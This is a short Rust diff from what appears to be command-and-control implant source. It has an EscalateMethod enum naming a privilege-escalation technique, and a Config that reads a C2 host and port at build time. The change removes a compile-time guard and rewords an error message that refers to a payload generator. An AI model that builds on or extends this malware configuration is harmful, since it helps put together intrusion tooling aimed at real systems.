@@ -47,18 +47,10 @@ pub enum EscalateMethod {
     CopyFailFd9,
 }
 
-// Compile-time guard: C2_HOST must be set
-#[allow(dead_code)]
-const _REQUIRE_C2_HOST: () = {
-    if option_env!("C2_HOST").is_none() {
-        panic!("C2_HOST is required — set it via payload-gen or raw: C2_HOST=10.0.0.1 cargo build");
-    }
-};
-
 impl Config {
     pub fn load() -> Self {
         let c2_host = option_env!("C2_HOST")
-            .expect("C2_HOST is required")
+            .expect("C2_HOST is required — set via payload-gen or env var")
             .to_string();
         let c2_port: u16 = option_env!("C2_PORT")
             .and_then(|s| s.parse().ok())
